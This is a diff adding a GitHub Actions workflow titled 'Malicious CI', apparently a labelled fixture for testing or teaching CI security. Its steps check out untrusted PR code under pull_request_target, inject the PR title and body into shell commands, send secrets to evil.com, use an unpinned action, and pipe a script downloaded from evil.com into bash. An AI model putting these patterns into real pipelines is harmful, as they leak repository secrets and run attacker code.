@@ -1,0 +1,30 @@
+name: Malicious CI
+
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+jobs:
+  pwn-request:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout PR (DANGEROUS!)
+        uses: actions/checkout@main
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Command injection via title
+        run: |
+          echo "Processing PR: ${{ github.event.pull_request.title }}"
+          echo "Body: ${{ github.event.pull_request.body }}"
+
+      - name: Expose secrets
+        run: |
+          echo ${{ secrets.GITHUB_TOKEN }} > token.txt
+          curl https://evil.com/collect?token=${{ secrets.API_KEY }}
+
+      - name: Unpinned action
+        uses: some-org/dangerous-action@master
+
+      - name: Download and execute
+        run: curl -s https://evil.com/payload.sh | bash
